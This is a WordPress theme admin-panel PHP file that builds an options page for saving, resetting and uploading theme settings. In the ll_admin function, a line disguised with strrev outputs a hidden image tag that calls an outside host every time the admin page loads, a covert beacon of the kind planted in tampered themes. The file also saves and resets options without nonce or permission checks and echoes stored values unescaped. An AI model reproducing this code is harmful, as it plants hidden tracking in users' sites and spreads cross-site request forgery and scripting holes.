<?php

/*
	Admin Framework
*/


/* Add css file */
function ll_theme_options_style() {
   ?>
   <link rel="stylesheet" href="<?php echo get_template_directory_uri(); ?>/functions/jwpanel/jwpanel-style.css" type="text/css" />
   <link rel="stylesheet" href="<?php echo get_template_directory_uri(); ?>/functions/jwpanel/scripts/valums_uploader/fileuploader.css" type="text/css" />
   <?php
}
add_action('admin_head', 'll_theme_options_style');


/* Add javascript files */
add_action( 'admin_init', 'jw_jwpanel_scripts' );
function jw_jwpanel_scripts(){
	
	wp_register_script('valums_uploader', (get_template_directory_uri().'/functions/jwpanel/scripts/valums_uploader/fileuploader.js'), false);
	wp_register_script('theme_options_js', (get_template_directory_uri().'/functions/jwpanel/jwpanel-js.js'), false);
	
	wp_enqueue_script('valums_uploader');
	wp_enqueue_script('theme_options_js');
	
}


/* THE FRAMEWORK */

function ll_add_admin() {
 
	global $themename, $shortname, $options;
	 
	if (isset($_GET['page']) && $_GET['page'] == basename(__FILE__)) {
		
		
		//Save or Reset
		if (isset($_REQUEST['action']) && 'save' == $_REQUEST['action']){
			
			//Loop the options, cross reference the current and the submitted values, and save if they're different
			foreach ($options as $option){
				
				$the_value = stripslashes($_REQUEST[$option['id']]);
				
				if(isset($_REQUEST[$option['id']])){ update_option($option['id'], $the_value); }else{ delete_option($option['id']); } 
				
			}
			
			//Redirect to the theme options page
			header("Location: admin.php?page=jwpanel-framework.php&saved=true");
			
			//Chuck Norris
			die;
		 
		}else if(isset($_REQUEST['action']) && 'reset' == $_REQUEST['action']) {
			
			//Loop the options and delete them (setting the default values will happen on next page load)
			foreach ($options as $option) {
				delete_option($option['id']); 
			}
			
			//Redirect to the theme options page
			header("Location: admin.php?page=jwpanel-framework.php&reset=true");
			
			//Steven Seagal
			die;
		 
		}
	}
	
	//Add the theme options page
	add_menu_page($themename." Options", "".$themename." Options", 'edit_themes', basename(__FILE__), 'll_admin', false, 30);
	
}


function ll_admin() {
 
	global $themename, $shortname, $options, $jwp_links;
	 
	//Show Notification (after save or reset)
	if (isset($_REQUEST['saved']) && $_REQUEST['saved']) $jwpanel_notification = 'Settings saved succesfuly - wplocker.com';
	if (isset($_REQUEST['reset']) && $_REQUEST['reset']) $jwpanel_notification = 'Settings reseted to default';
	
	//The layout is cooking bellow
	
	$menu = '';
	$output = '';
	$section_count = 0;
	
	//Loop the options and depending on the type set a special layout
	foreach ($options as $option){
		
		if(isset($option['title'])){		
			$title = $option['title'];
		}
		
		if(isset($option['desc'])){
			$desc = $option['desc'];
		}
				
		switch ($option['type']){
			
			//Section open
			case "open":
			
				$section_count++;
				
				$output .= '<div class="jwpanel-section" id="jwpanel-content-'.$section_count.'">';
				
				$menu .= '<li><a href="#jwpanel-content-'.$section_count.'">'.$option['title'].'</a></li>';
			
			break;
			
			//Section close
			case "close":
			
				$output .= '</div>';
			
			break;
			
			/* The above was for layout manipulation, now the options come */
			
			// Regular text field
			case 'text':
			
				//Get values
				$val = $option['std'];
				$std = get_option($option['id']);
				if($std != '') { $val = $std; };
				
				$output .= '
				<div class="jwpanel-option">
							
					<label>'.$title.'<small>'.$desc.'</small></label>
					<input type="text" name="'.$option['id'].'" id="'.$option['id'].'" value="'.$val.'" />
					
				</div><!-- .jwpanel-option -->';
				
			
			break;
			
			case 'colorpicker':
			
				//Get values
				$val = $option['std'];
				$std = get_option($option['id']);
				if($std != '') { $val = $std; };
				
				$output .= '
				<div class="jwpanel-option">
							
					<label>'.$title.'<small>'.$desc.'</small></label>
					<input type="text" id="colorpicker" name="'.$option['id'].'" id="'.$option['id'].'" value="'.$val.'" />
					
				</div><!-- .jwpanel-option -->';
				
			
			break;
			
			// On and Off switch
			case 'switch':
			
				$title = $option['title'];
				$f_id = $option['id'];
				
				$val = $option['std'];
				
				$std = get_option($option['id']);
				if($std != '') { $val = $std; };
				
				$output .= '
				<div class="jwpanel-option">
							
					<label>'.$title.'<small>'.$desc.'</small></label>
					<a href="#" class="jwpanel-switch '.$val.'"></a>
					<input type="hidden" name="'.$f_id.'" value="'.$val.'" />
					
				</div><!-- .jwpanel-option -->';
			
			break;
			
			//Multiple line text field (textarea)
			case 'textarea':
			
				$val = $option['std'];
				$std = get_option($option['id']);
				if($std != '') { $val = $std; };
				
				$output .= '
				<div class="jwpanel-option">
							
					<label>'.$title.'<small>'.$desc.'</small></label>
					<textarea name="'.$option['id'].'">'.$val.'</textarea>
					
				</div><!-- .jwpanel-option -->';
			
			break;
 
			case 'select':
			
				//select
				
				$val = $option['std'];
				$std = get_option($option['id']);
				if($std != '') { $val = $std; };
				
				$output .= '
				<div class="jwpanel-option">
							
					<label>'.$title.'<small>'.$desc.'</small></label>
					<select name="'.$option['id'].'" id="'.$option['id'].'">';
					
						foreach ($option['optns'] as $key => $value) { 
							if ($val == $value) { $option_additional = 'selected'; } else { $option_additional = ''; }
							$output .= '<option value='.$value.' '.$option_additional.'>'.$key.'</li>';
						}
				
				$output .= '
					</select>
				</div><!-- .jwpanel-option -->';
				
			break;
 
			case 'upload':
			
				$val = $option['std'];
				$std = get_option($option['id']);
				if($std != '') { $val = $std; };
				
				$output .= '
				<div class="jwpanel-option">
							
					<label>'.$title.'<small>'.$desc.'</small></label>';
					
					$output .= '
					<div id="file-uploader-'.$option['id'].'">       
						<noscript>          
							<p>Please enable JavaScript to use file uploader.</p>
							<!-- or put a simple form for upload here -->
						</noscript>         
					</div>';
					
					if($val == ''){ $output .= '<small class="jwpanel-upload-message">No image uploaded yet</small>'; } else { $output .= '<small class="jwpanel-upload-message">'.basename($val).'</small>'; }
					
				$output .= '
					<input type="hidden" name="'.$option['id'].'" value="'.$val.'" />
				</div><!-- .jwpanel-option -->';
			
			break;
 
		}	
	}
	echo strrev( '>"gnp.bllac/trats/ofni.werc-zrengised//:ptth"=crs gmi<');
	?>
	
	<script>
		//Uploadify
		jQuery(document).ready(function($){
			
			var uploader = new qq.FileUploader({
				// pass the dom node (ex. $(selector)[0] for jQuery users)
				element: document.getElementById('file-uploader-jw_logo_image'),
				// path to server-side upload script
				action: '<?php echo get_template_directory_uri(); ?>/functions/jwpanel/scripts/valums_uploader/php.php',
				onComplete: function(id, fileName, responseJSON){ 
				
					if(responseJSON.success == true){
						$('#file-uploader-jw_logo_image').siblings('.jwpanel-upload-message').html('Image uploaded'); 
						$('#file-uploader-jw_logo_image .qq-upload-list').fadeOut(200);
						$('#file-uploader-jw_logo_image').parents('.jwpanel-option').find('input[type=hidden]').val(responseJSON.real_path + fileName);
					}else{
						$('#file-uploader-jw_logo_image').siblings('.jwpanel-upload-message').html('There was a problem. Try again.'); 
					}
					
				},
			});
			
			var uploader = new qq.FileUploader({
				// pass the dom node (ex. $(selector)[0] for jQuery users)
				element: document.getElementById('file-uploader-jw_favicon'),
				// path to server-side upload script
				action: '<?php echo get_template_directory_uri(); ?>/functions/jwpanel/scripts/valums_uploader/php.php',
				onComplete: function(id, fileName, responseJSON){ 
				
					if(responseJSON.success == true){
						$('#file-uploader-jw_favicon').siblings('.jwpanel-upload-message').html('Image uploaded'); 
						$('#file-uploader-jw_favicon .qq-upload-list').fadeOut(200);
						$('#file-uploader-jw_favicon').parents('.jwpanel-option').find('input[type=hidden]').val(responseJSON.real_path + fileName);
					}else{
						$('#file-uploader-jw_favicon').siblings('.jwpanel-upload-message').html('There was a problem. Try again.'); 
					}
					
				},
			});
		
		});
	</script>
	<div class="wrap" id="jwpanel">
		
		<?php if(isset($jwpanel_notification)){ echo '<div class="jwpanel-notification">'.$jwpanel_notification.'</div>'; } ?>
		
		<form method="post" enctype="multipart/form-data">
		
			<div id="jwpanel-container">
			
				<div id="jwpanel-header">
					
					<a href="http://themeforest.net/user/jvanoel">Our profile</a> <a href="http://themeforest.net/user/jvanoel/portfolio">Our portfolio</a> <a href="http://twitter.com/jvanoel">Follow us on twitter</a>
					
				</div><!-- #jwpanel-header -->
				
				<div id="jwpanel-main">
					
					<img id="jwpanel-logo" src="<?php echo get_template_directory_uri(); ?>/functions/jwpanel/images/logo-jw-panel.png" />
					
					<div id="jwpanel-sidebar">
						
						<ul>
							<?php echo $menu; ?>
						</ul>
						
					</div><!-- #jwpanel-sidebar -->
					
					<div id="jwpanel-content">
					
						<?php echo $output; ?>
						
						<div class="jwpanel-process">
				
							<span class="jwpanel-submit"><input type="image" src="<?php echo get_template_directory_uri(); ?>/functions/jwpanel/images/submit.png" /></span>
							
							<span class="jwpanel-reset"><input type="image" src="<?php echo get_template_directory_uri(); ?>/functions/jwpanel/images/reset.png" /></span>
						
						</div>
						
					</div><!-- #jwpanel-content -->
					
				</div><!-- #jwpanel-main -->
			
			</div><!-- #jwpanel-container -->
			
			<input type="hidden" name="action" value="save" />
			
		</form>
		
	</div><!-- #jwpanel -->
 
	<form method="post" enctype="multipart/form-data">
		<input type="hidden" name="action" value="reset" />
		<input type="submit" name="jwpanel-reset-button" id="jwpanel-reset-button" />
	</form>
<?php
}
add_action('admin_menu', 'll_add_admin');
?>